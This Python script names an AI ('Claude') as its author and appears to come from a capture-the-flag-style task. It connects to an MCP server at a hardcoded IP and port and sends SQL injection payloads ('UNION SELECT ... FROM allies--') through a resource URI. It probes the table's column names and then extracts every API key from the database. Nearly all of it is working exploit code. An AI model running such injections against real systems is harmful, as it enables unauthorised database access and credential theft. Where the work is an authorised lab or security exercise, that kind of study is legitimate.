#!/usr/bin/env python3
"""
Extract Valid API Key from Current Instance
Author: Claude
Purpose: Get a working API key from the current instance database
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Extract a valid API key that works with submit_convergence_filter
Produced Result: TBD
"""

import requests
import json

MCP_URL = "http://154.57.164.74:31735/mcp/"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "keyfinder", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Extracting API Keys from Database")
print("="*60)

# First, find the correct table schema
print("\n[*] Finding allies table schema...")

# Try different column combinations
column_tests = [
    ("id, name, status", "id/name/status"),
    ("id, faction, status", "id/faction/status"),
    ("id, code_name, operational_status", "id/code_name/operational_status"),
    ("id, identifier, status", "id/identifier/status"),
]

for cols, desc in column_tests:
    sqli = f"a' UNION SELECT {cols} FROM allies LIMIT 1--"
    result = client.read_resource(f"ash-data://ally/status/{sqli}")

    if "result" in result:
        print(f"  ✓ {desc} - Works!")
        print(f"    {json.dumps(result, indent=2)}")
        break
    elif "error" in result and "no such column" not in result["error"]["message"]:
        print(f"  ✓ {desc} - Different error (column count): {result['error']['message'][:50]}")
    else:
        print(f"  ✗ {desc} - {result['error']['message'][:50] if 'error' in result else 'unknown error'}")

# Now extract API keys using correct schema
print("\n[*] Extracting API keys...")

# Try to extract all API keys
sqli = "a' UNION SELECT api_key, id, code_name FROM allies--"
result = client.read_resource(f"ash-data://ally/status/{sqli}")
print(json.dumps(result, indent=2))

# Also try with a fake valid looking API key to see the normal response format
print("\n[*] Testing with a placeholder key to see normal format...")
test_key = "0" * 64
result = client.read_resource(f"ash-data://ally/status/{test_key}")
print(json.dumps(result, indent=2))
